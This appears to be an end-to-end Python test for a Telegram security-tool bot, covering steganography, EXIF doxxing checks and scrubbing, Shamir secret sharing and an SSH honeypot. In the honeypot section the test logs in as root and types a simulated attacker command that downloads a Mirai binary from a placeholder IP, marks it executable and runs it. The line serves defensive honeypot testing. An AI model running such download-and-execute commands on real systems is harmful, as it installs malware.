"""End-to-end: drive the real handlers with fake Telegram updates through a mock Bot API."""
import asyncio, io, json, os, re, sys, tempfile, time
import numpy as np
from PIL import Image

HERE = os.path.dirname(__file__)
TMP = tempfile.mkdtemp()
os.environ.update(BOT_TOKEN="123:TEST", OWNER_ID="1001", DATA_DIR=TMP, HONEYPOT_PORT="22223",
                  PATH=os.path.join(HERE, "fakebin") + os.pathsep + os.environ["PATH"])
sys.path.insert(0, os.path.dirname(HERE))

import asyncssh
from telegram import Update
from telegram.request import BaseRequest
from nullbyte import bot as B

OWNER, FRIEND, GROUP = 1001, 2002, -5005
FILES: dict[str, bytes] = {}
SENT: list[dict] = []


class FakeAPI(BaseRequest):
    def __init__(self):
        self.mid = 1000

    async def initialize(self): pass
    async def shutdown(self): pass

    def _msg(self, params, extra=None):
        self.mid += 1
        chat_id = int(params.get("chat_id", OWNER))
        m = {"message_id": params.get("message_id", self.mid), "date": int(time.time()),
             "chat": {"id": chat_id, "type": "private" if chat_id > 0 else "group"},
             "from": {"id": 999, "is_bot": True, "first_name": "NULLBYTE", "username": "nullbyte_bot"}}
        if "text" in params:
            m["text"] = params["text"]
        if extra:
            m.update(extra)
        return m

    async def do_request(self, url, method, request_data=None, **kw):
        endpoint = url.rsplit("/", 1)[-1]
        if "/file/bot" in url:
            return 200, FILES[endpoint]
        p = dict(request_data.parameters) if request_data else {}
        files = {}
        if request_data and request_data.multipart_data:
            for k, v in request_data.multipart_data.items():
                files[k] = v
        SENT.append({"method": endpoint, "params": p, "files": files})
        if endpoint == "getMe":
            r = {"id": 999, "is_bot": True, "first_name": "NULLBYTE", "username": "nullbyte_bot"}
        elif endpoint in ("sendMessage", "editMessageText", "sendDocument", "sendPhoto", "sendLocation"):
            r = self._msg(p)
        elif endpoint == "getFile":
            fid = p["file_id"]
            r = {"file_id": fid, "file_unique_id": fid, "file_size": len(FILES[fid]), "file_path": fid}
        else:
            r = True
        return 200, json.dumps({"ok": True, "result": r}).encode()


UID = [0]
def upd(user=OWNER, chat=None, text=None, doc=None, cb=None):
    UID[0] += 1
    chat = chat or user
    ch = {"id": chat, "type": "private" if chat > 0 else "group"}
    frm = {"id": user, "is_bot": False, "first_name": {OWNER: "Matin", FRIEND: "Ali"}.get(user, "U")}
    if cb:
        return {"update_id": UID[0], "callback_query": {"id": str(UID[0]), "from": frm, "chat_instance": "x", "data": cb,
                "message": {"message_id": 1, "date": int(time.time()), "chat": ch, "text": "menu"}}}
    m = {"message_id": 5000 + UID[0], "date": int(time.time()), "chat": ch, "from": frm}
    if text is not None:
        m["text"] = text
        if text.startswith("/"):
            m["entities"] = [{"type": "bot_command", "offset": 0, "length": len(text.split()[0])}]
    if doc:
        fid, name = doc
        m["document"] = {"file_id": fid, "file_unique_id": fid, "file_name": name, "file_size": len(FILES[fid])}
    return {"update_id": UID[0], "message": m}


def texts(since):
    return [s["params"].get("text", "") or s["params"].get("caption", "") for s in SENT[since:]]


def strip(t):
    return re.sub(r"<[^>]+>", "", t)


def photo_bytes(fmt="PNG"):
    y, x = np.mgrid[0:300, 0:400]
    arr = np.clip(np.stack([x * .6, y * .8, (x + y) * .3], -1) + np.random.default_rng(1).normal(0, 5, (300, 400, 3)), 0, 255).astype(np.uint8)
    b = io.BytesIO(); Image.fromarray(arr).save(b, fmt); return b.getvalue()


def test_everything():
    asyncio.run(_run())


async def _run():
    B.reverse_geocode = lambda lat, lon: asyncio.sleep(0, result="Sultanahmet, Fatih, İstanbul")
    app = B.Application.builder().token("123:TEST").request(FakeAPI()).get_updates_request(FakeAPI()) \
        .defaults(B.Defaults(parse_mode=B.ParseMode.HTML)).build()
    # reuse the real handler wiring
    real = B.build_app()
    for group, hs in real.handlers.items():
        for h in hs:
            app.add_handler(h, group)
    app.add_error_handler(B.on_error)
    await app.initialize()
    await B.post_init(app)
    go = lambda d: app.process_update(Update.de_json(d, app.bot))

    # ---- boot
    n = len(SENT); await go(upd(text="/start"))
    out = strip(texts(n)[-1]); assert "STEGANOGRAPHY" in out
    print("\n=== /start final ===\n" + out[:600])

    # ---- hide via file menu
    FILES["cover"] = photo_bytes("JPEG")
    n = len(SENT); await go(upd(doc=("cover", "vacation.jpg")))
    assert "select operation" in strip(texts(n)[-1])
    await go(upd(cb="f:hide"))
    await go(upd(text="meet at the old lab, 0300. bring the ESP32."))
    n = len(SENT); await go(upd(text="correct horse battery staple"))
    docs = [s for s in SENT[n:] if s["method"] == "sendDocument"]
    assert docs, texts(n)
    fname, fbytes, _ = docs[-1]["files"]["document"]
    assert fname == "vacation.png"
    print("\n=== hide report ===\n" + strip(next(t for t in texts(n) if "EMBEDDED" in t)))
    deleted = [s for s in SENT[n - 10:] if s["method"] == "deleteMessage"]
    assert deleted, "secret/passphrase messages should be deleted"
    FILES["stego"] = fbytes

    # ---- reveal right + wrong
    await go(upd(text="/reveal")); await go(upd(doc=("stego", "vacation.png")))
    n = len(SENT); await go(upd(text="correct horse battery staple"))
    t = texts(n)[-1]; assert "ACCESS GRANTED" in t and "0300" in t and "tg-spoiler" in t
    print("\n=== reveal ===\n" + strip(t))
    await go(upd(text="/reveal")); await go(upd(doc=("stego", "vacation.png")))
    n = len(SENT); await go(upd(text="hunter2")); assert "A C C E S S" in texts(n)[-1]

    # ---- detect with appended zip
    FILES["zipjpg"] = photo_bytes("JPEG") + b"PK\x03\x04" + os.urandom(300)
    await go(upd(text="/detect"))
    n = len(SENT); await go(upd(doc=("zipjpg", "cat.jpg")))
    t = "\n".join(texts(n)); assert "AFTER EOF" in t and "ZIP" in t
    assert any(s["method"] == "sendPhoto" for s in SENT[n:]) and any(s["method"] == "sendDocument" for s in SENT[n:])
    print("\n=== detect ===\n" + strip(next(x for x in texts(n) if "STEGANALYSIS" in x)))

    # ---- exif
    import piexif
    img = Image.fromarray(np.full((240, 320, 3), 90, np.uint8)); b = io.BytesIO()
    ex = {"0th": {piexif.ImageIFD.Make: b"Apple", piexif.ImageIFD.Model: b"iPhone 15 Pro", piexif.ImageIFD.Software: b"17.5.1"},
          "Exif": {piexif.ExifIFD.DateTimeOriginal: b"2026:11:20 23:41:07", piexif.ExifIFD.OffsetTimeOriginal: b"+03:00",
                   piexif.ExifIFD.BodySerialNumber: b"F2LXK9ABCD", piexif.ExifIFD.LensModel: b"iPhone 15 Pro back camera 6.86mm f/1.78",
                   piexif.ExifIFD.FNumber: (178, 100), piexif.ExifIFD.ExposureTime: (1, 60), piexif.ExifIFD.ISOSpeedRatings: 640},
          "GPS": {piexif.GPSIFD.GPSLatitudeRef: b"N", piexif.GPSIFD.GPSLatitude: ((41, 1), (0, 1), (3240, 100)),
                  piexif.GPSIFD.GPSLongitudeRef: b"E", piexif.GPSIFD.GPSLongitude: ((28, 1), (58, 1), (3600, 100)),
                  piexif.GPSIFD.GPSAltitude: (42, 1), piexif.GPSIFD.GPSImgDirection: (31000, 100)}}
    img.save(b, "JPEG", exif=piexif.dump(ex)); FILES["gps"] = b.getvalue()
    await go(upd(doc=("gps", "IMG_2041.jpg")))
    n = len(SENT); await go(upd(cb="f:exif"))
    t = "\n".join(texts(n)); assert "DOXX-O-METER" in t and "BodySerialNumber" in t
    assert any(s["method"] == "sendLocation" for s in SENT[n:])
    print("\n=== exif ===\n" + strip(next(x for x in texts(n) if "DOXX" in x)))
    n = len(SENT); await go(upd(cb="x:scrub"))
    t = "\n".join(texts(n)); assert "SCRUB COMPLETE" in t and "gone ✓" in t
    await go(upd(cb="x:raw"))

    # ---- compressed photo warning
    n = len(SENT)
    await go({"update_id": 99999, "message": {"message_id": 1, "date": 1, "chat": {"id": OWNER, "type": "private"},
              "from": {"id": OWNER, "is_bot": False, "first_name": "M"},
              "photo": [{"file_id": "p", "file_unique_id": "p", "width": 10, "height": 10}]}})
    assert "LOSSY" in texts(n)[-1]

    # ---- capsule (fake tle)
    await go(upd(text="/capsule 3s"))
    n = len(SENT); await go(upd(text="dear future me: did the patent get granted?"))
    t = "\n".join(texts(n)); assert "SEALED" in t, t
    assert any(s["method"] == "sendDocument" and s["files"]["document"][0].endswith(".age") for s in SENT[n:])
    print("\n=== capsule sealed ===\n" + strip(next(x for x in texts(n) if "SEALED" in x)))
    n = len(SENT); await go(upd(text="/capsules")); assert "#1" in strip(texts(n)[-1])
    await asyncio.sleep(4.5)
    ctx = B.ContextTypes.DEFAULT_TYPE(app)
    n = len(SENT); await B.job_capsules(ctx)
    t = "\n".join(texts(n)); assert "UNSEALED" in t and "patent" in t, t
    print("\n=== capsule unsealed ===\n" + strip([x for x in texts(n) if "UNSEALED" in x][-1]))

    # ---- shamir split / combine
    await go(upd(text="/split 3 5"))
    n = len(SENT); await go(upd(text="seed: abandon ability able about above absent"))
    shares = re.findall(r"sss1-[0-9a-z-]+", "\n".join(texts(n)))
    assert len(shares) == 5, shares
    print("\n=== share example ===\n" + strip([x for x in texts(n) if "SHARE 2/5" in x][0]))
    await go(upd(text="/combine"))
    await go(upd(text=shares[0]))
    n = len(SENT); await go(upd(text=shares[3] + "\n" + shares[4]))
    t = "\n".join(texts(n)); assert "RECONSTRUCTED" in t and "abandon ability" in t

    # ---- ceremony in a group
    n = len(SENT); await go(upd(user=OWNER, chat=GROUP, text="/ceremony"))
    code = re.search(r"code\s+([0-9A-F]{6})", strip(texts(n)[-1])).group(1)
    await go(upd(user=FRIEND, text=f"/contribute {code} {shares[1]}"))
    await go(upd(user=2003, text=f"/contribute {code} {shares[2]}"))
    n = len(SENT); await go(upd(user=2004, text=f"/contribute {code} {shares[0]}"))
    to_owner = [s for s in SENT[n:] if s["method"] == "sendMessage" and int(s["params"]["chat_id"]) == OWNER]
    assert to_owner and "abandon" in to_owner[-1]["params"]["text"]
    n = len(SENT); await go(upd(user=FRIEND, chat=GROUP, text=f"/contribute {code} {shares[1]}"))
    assert any(s["method"] == "deleteMessage" for s in SENT[n:])

    # ---- honeypot
    assert "honeypot" in app.bot_data
    conn = None
    for i in range(15):
        try:
            conn = await asyncssh.connect("127.0.0.1", 22223, username="root", password=f"toor{i}", known_hosts=None, client_keys=None)
            break
        except asyncssh.PermissionDenied:
            pass
    async with conn:
        proc = await conn.create_process(term_type="xterm")
        for c in ["uname -a", "cat /proc/cpuinfo | grep name | wc -l", "cd /tmp; wget http://198.51.100.7/mirai.x86 -O .m; chmod 777 .m; ./.m", "exit"]:
            proc.stdin.write(c + "\n")
        await asyncio.wait_for(proc.stdout.read(), 10)
    await asyncio.sleep(3)  # let the notifier drain
    n = len(SENT); await go(upd(text="/hp")); print("\n=== /hp ===\n" + strip(texts(n)[-1]))
    n = len(SENT); await go(upd(text="/hp_stats 24h")); print("\n=== /hp_stats ===\n" + strip(texts(n)[-1]))
    n = len(SENT); await go(upd(text="/hp_replay 1")); t = strip(texts(n)[-1]); assert "wget" in t
    print("\n=== /hp_replay ===\n" + t)
    n = len(SENT); await go(upd(text="/hp_kiddie")); assert "KIDDIE" in strip("\n".join(texts(n)))
    n = len(SENT); await go(upd(user=FRIEND, text="/hp")); assert "owner-only" in texts(n)[-1]
    owner_alerts = [s["params"]["text"] for s in SENT if s["method"] == "sendMessage" and "INTRUDER" in s["params"].get("text", "")]
    assert owner_alerts
    print("\n=== intruder alert ===\n" + strip(owner_alerts[-1]))
    n = len(SENT); await go(upd(cb="hp:play:1")); edits = [s for s in SENT[n:] if s["method"] == "editMessageText"]
    assert len(edits) >= 3
    print("\n=== playback final frame ===\n" + strip(edits[-1]["params"]["text"]))

    errs = [s for s in SENT if "Segmentation" in s["params"].get("text", "")]
    assert not errs, errs
    await B.post_shutdown(app)
    await app.shutdown()
